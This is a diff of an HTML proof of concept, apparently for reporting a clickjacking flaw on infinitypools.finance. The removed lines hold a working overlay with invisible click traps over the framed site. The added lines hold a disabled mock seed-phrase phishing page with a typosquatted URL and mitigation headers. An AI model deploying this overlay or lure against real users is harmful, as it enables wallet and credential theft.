@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Free Crypto Rewards</title>
+    <title>Infinity Pools - Connect Wallet</title>
     <style>
         * {
             margin: 0;
@@ -13,263 +13,204 @@
 
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background: #0a0e27;
+            color: white;
             min-height: 100vh;
         }
 
-        .demo-banner {
-            background: #ff6b6b;
+        .warning-banner {
+            background: #ff3333;
             color: white;
-            padding: 15px;
+            padding: 20px;
             text-align: center;
             font-weight: bold;
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            z-index: 99999;
+            font-size: 18px;
+            animation: pulse 2s infinite;
         }
 
-        .demo-controls {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            background: white;
-            padding: 15px;
-            border-radius: 10px;
-            box-shadow: 0 5px 20px rgba(0,0,0,0.3);
-            z-index: 99999;
-        }
-
-        .demo-controls button {
-            display: block;
-            width: 100%;
-            margin: 5px 0;
-            padding: 10px;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            font-weight: bold;
-        }
-
-        .show-overlay {
-            background: #28a745;
-            color: white;
-        }
-
-        .hide-overlay {
-            background: #dc3545;
-            color: white;
-        }
-
-        .show-traps {
-            background: #ffc107;
-            color: #333;
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.7; }
         }
 
         .container {
-            padding-top: 60px;
-            max-width: 1400px;
-            margin: 0 auto;
+            max-width: 800px;
+            margin: 50px auto;
+            padding: 20px;
         }
 
-        .decoy-content {
-            background: white;
-            margin: 20px;
+        .attack-success {
+            background: linear-gradient(135deg, #ff6b6b 0%, #ee5a6f 100%);
             padding: 40px;
             border-radius: 15px;
             text-align: center;
+            margin-bottom: 30px;
+            box-shadow: 0 10px 40px rgba(255, 0, 0, 0.3);
         }
 
-        .decoy-content h1 {
-            color: #333;
+        .attack-success h1 {
+            font-size: 42px;
             margin-bottom: 20px;
-            font-size: 36px;
         }
 
-        .decoy-content p {
-            color: #666;
-            font-size: 18px;
+        .attack-success p {
+            font-size: 20px;
+            line-height: 1.6;
+        }
+
+        .fake-login {
+            background: white;
+            color: #333;
+            padding: 40px;
+            border-radius: 15px;
             margin-bottom: 30px;
         }
 
-        .iframe-container {
-            position: relative;
-            width: 100%;
-            height: 800px;
-            margin: 20px auto;
-            border-radius: 15px;
-            overflow: hidden;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
+        .fake-login h2 {
+            color: #333;
+            margin-bottom: 20px;
+            text-align: center;
         }
 
-        #legitimateIframe {
-            position: absolute;
-            top: 0;
-            left: 0;
+        .fake-input {
             width: 100%;
-            height: 100%;
+            padding: 15px;
+            margin: 10px 0;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+        }
+
+        .fake-button {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
             border: none;
-            opacity: 0.5;
-        }
-
-        .malicious-overlay {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            pointer-events: none;
-            z-index: 100;
-        }
-
-        .click-trap {
-            position: absolute;
-            pointer-events: auto;
+            border-radius: 8px;
+            font-size: 18px;
+            font-weight: bold;
             cursor: pointer;
-            background: transparent;
-            border: none;
+            margin-top: 20px;
         }
 
-        .click-trap.visible {
-            background: rgba(255, 0, 0, 0.3);
-            border: 3px solid red;
+        .fake-button:hover {
+            opacity: 0.9;
         }
 
-        .click-trap:hover.visible {
-            background: rgba(255, 0, 0, 0.5);
+        .info-box {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 30px;
+            border-radius: 15px;
+            border-left: 5px solid #ffc107;
         }
 
-        /* Position traps over common button locations */
-        .trap-center {
-            top: 45%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            width: 300px;
-            height: 60px;
+        .info-box h3 {
+            color: #ffc107;
+            margin-bottom: 15px;
         }
 
-        .trap-top {
-            top: 20%;
-            left: 50%;
-            transform: translateX(-50%);
-            width: 250px;
-            height: 50px;
+        .info-box ul {
+            margin-left: 20px;
+            line-height: 2;
         }
 
-        .trap-bottom {
-            bottom: 20%;
-            left: 50%;
-            transform: translateX(-50%);
-            width: 250px;
-            height: 50px;
+        .info-box li {
+            margin: 10px 0;
         }
 
-        .trap-left {
-            top: 50%;
-            left: 15%;
-            transform: translateY(-50%);
-            width: 200px;
-            height: 50px;
+        .url-bar {
+            background: #1a1f3a;
+            padding: 15px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            text-align: center;
+            font-family: monospace;
+            border: 2px solid #ffc107;
         }
 
-        .trap-right {
-            top: 50%;
-            right: 15%;
-            transform: translateY(-50%);
-            width: 200px;
-            height: 50px;
-        }
-
-        /* Large area trap to catch most clicks */
-        .trap-wide {
-            top: 35%;
-            left: 50%;
-            transform: translateX(-50%);
-            width: 80%;
-            height: 40%;
+        .url-bar span {
+            color: #ffc107;
+            font-weight: bold;
         }
     </style>
 </head>
 <body>
-    <div class="demo-banner">
-        🔴 SECURITY RESEARCH PoC - This demonstrates clickjacking vulnerability on infinitypools.finance
-    </div>
-
-    <div class="demo-controls">
-        <h4 style="margin-bottom: 10px;">Demo Controls:</h4>
-        <button class="show-overlay" onclick="showIframe()">Show Legitimate Site</button>
-        <button class="hide-overlay" onclick="hideIframe()">Hide Site (Real Attack)</button>
-        <button class="show-traps" onclick="toggleTraps()">Toggle Red Zones</button>
-        <p style="margin-top: 10px; font-size: 12px; color: #666;">
-            Click zones = Malicious links<br>
-            They redirect to attacker site
-        </p>
+    <div class="warning-banner">
+        🚨 CLICKJACKING ATTACK SUCCESSFUL - USER HAS BEEN REDIRECTED 🚨
     </div>
 
     <div class="container">
-        <div class="iframe-container">
-            <!-- The legitimate Infinity Pools site -->
-            <iframe 
-                id="legitimateIframe"
-                src="https://infinitypools.finance/earn"
-                sandbox="allow-scripts allow-same-origin"
-            ></iframe>
+        <div class="attack-success">
+            <h1>⚠️ ATTACK DEMONSTRATION</h1>
+            <p><strong>The victim clicked what they thought was a button on infinitypools.finance</strong></p>
+            <p style="margin-top: 20px;">They have now been redirected to this attacker-controlled phishing site!</p>
+        </div>
 
-            <!-- Invisible malicious overlay with click traps -->
-            <div class="malicious-overlay" id="maliciousOverlay">
-                <!-- Multiple click traps positioned to catch button clicks -->
-                <a href="phishing-site.html" class="click-trap trap-center" id="trap1" target="_blank"></a>
-                <a href="phishing-site.html" class="click-trap trap-top" id="trap2" target="_blank"></a>
-                <a href="phishing-site.html" class="click-trap trap-bottom" id="trap3" target="_blank"></a>
-                <a href="phishing-site.html" class="click-trap trap-left" id="trap4" target="_blank"></a>
-                <a href="phishing-site.html" class="click-trap trap-right" id="trap5" target="_blank"></a>
-                <a href="phishing-site.html" class="click-trap trap-wide" id="trap6" target="_blank"></a>
-            </div>
+        <div class="url-bar">
+            <p>🌐 Attacker's URL: <span>https://infinitypooIs.finance/connect</span></p>
+            <p style="font-size: 12px; margin-top: 10px; color: #999;">
+                (Notice the capital "i" instead of lowercase "L" - a common phishing technique)
+            </p>
+        </div>
+
+        <div class="fake-login">
+            <h2>🔒 Connect Your Wallet</h2>
+            <p style="text-align: center; color: #666; margin-bottom: 20px;">
+                To continue earning, please enter your wallet recovery phrase
+            </p>
+            <input type="text" class="fake-input" placeholder="Wallet Address" disabled>
+            <textarea class="fake-input" rows="4" placeholder="Enter your 12 or 24 word recovery phrase..." disabled></textarea>
+            <button class="fake-button" disabled>Connect Wallet (DEMO - Disabled)</button>
+            <p style="text-align: center; color: #999; margin-top: 15px; font-size: 14px;">
+                ⚠️ In a real attack, this would steal the user's credentials
+            </p>
+        </div>
+
+        <div class="info-box">
+            <h3>💀 What Would Happen in a Real Attack:</h3>
+            <ul>
+                <li><strong>Wallet Drainage:</strong> User's recovery phrase is stolen, attacker gains full access to their crypto wallet</li>
+                <li><strong>Malicious Approvals:</strong> User unknowingly signs smart contract approvals giving attacker unlimited token access</li>
+                <li><strong>Session Hijacking:</strong> Cookies and session tokens are stolen for account takeover</li>
+                <li><strong>Credential Theft:</strong> Login information captured for future attacks</li>
+                <li><strong>Social Engineering:</strong> User trusts the site because they clicked through from what appeared to be legitimate</li>
+            </ul>
+        </div>
+
+        <div class="info-box" style="margin-top: 20px; border-left-color: #28a745;">
+            <h3>✅ How to Prevent This Attack:</h3>
+            <ul>
+                <li><strong>X-Frame-Options: DENY</strong> - Prevents the site from being embedded in iframes</li>
+                <li><strong>Content-Security-Policy: frame-ancestors 'none'</strong> - Modern alternative to X-Frame-Options</li>
+                <li><strong>Frame-busting JavaScript</strong> - Secondary defense (can be bypassed, not recommended as primary defense)</li>
+            </ul>
+            <p style="margin-top: 20px; color: #28a745;">
+                <strong>Implementation:</strong> Add these headers to your server response:
+            </p>
+            <pre style="background: #0a0e27; padding: 15px; border-radius: 5px; margin-top: 10px; overflow-x: auto;">
+X-Frame-Options: DENY
+Content-Security-Policy: frame-ancestors 'none'</pre>
+        </div>
+
+        <div style="text-align: center; margin-top: 40px; padding: 20px; background: rgba(255,255,255,0.05); border-radius: 10px;">
+            <p style="font-size: 14px; color: #999;">This is a security research demonstration</p>
+            <p style="font-size: 14px; color: #999; margin-top: 10px;">Report submitted for: infinitypools.finance</p>
         </div>
     </div>
 
     <script>
-        const iframe = document.getElementById('legitimateIframe');
-        const traps = document.querySelectorAll('.click-trap');
-        let trapsVisible = false;
-
-        function showIframe() {
-            iframe.style.opacity = '0.5';
-        }
-
-        function hideIframe() {
-            iframe.style.opacity = '0';
-            alert('⚠️ REAL ATTACK MODE: The iframe is now invisible. Users see only the decoy content but clicking anywhere redirects to the attacker\'s phishing site!');
-        }
-
-        function toggleTraps() {
-            trapsVisible = !trapsVisible;
-            traps.forEach(trap => {
-                if (trapsVisible) {
-                    trap.classList.add('visible');
-                } else {
-                    trap.classList.remove('visible');
-                }
-            });
-        }
-
-        // Log clicks for demonstration
-        traps.forEach((trap, index) => {
-            trap.addEventListener('click', function(e) {
-                console.log(`🚨 ATTACK: Click trap ${index + 1} triggered - Redirecting to phishing site`);
-            });
-        });
-
-        iframe.addEventListener('load', () => {
-            console.log('✅ Legitimate site loaded in iframe');
-            console.log('🎯 Malicious click traps are active');
-        });
-
-        iframe.addEventListener('error', () => {
-            console.error('❌ Failed to load - Site may have X-Frame-Options protection');
-            alert('The target site could not be loaded. This might mean they already have clickjacking protection enabled (X-Frame-Options or CSP frame-ancestors).');
-        });
+        // Log the successful "attack" for demonstration
+        console.log('🚨 ATTACK SUCCESSFUL');
+        console.log('📍 Victim redirected to phishing site');
+        console.log('🎯 Attacker can now:');
+        console.log('   - Display fake wallet connection prompts');
+        console.log('   - Steal recovery phrases');
+        console.log('   - Execute malicious smart contracts');
+        console.log('   - Capture credentials');
+        
+        // Alert to make it clear this is a demonstration
+        alert('⚠️ CLICKJACKING ATTACK DEMONSTRATION\n\nThe victim thought they were clicking a button on the legitimate infinitypools.finance site.\n\nInstead, they were redirected to this attacker-controlled phishing site.\n\nIn a real attack, this page would look identical to Infinity Pools and steal the user\'s wallet credentials.');
     </script>
 </body>
 </html>
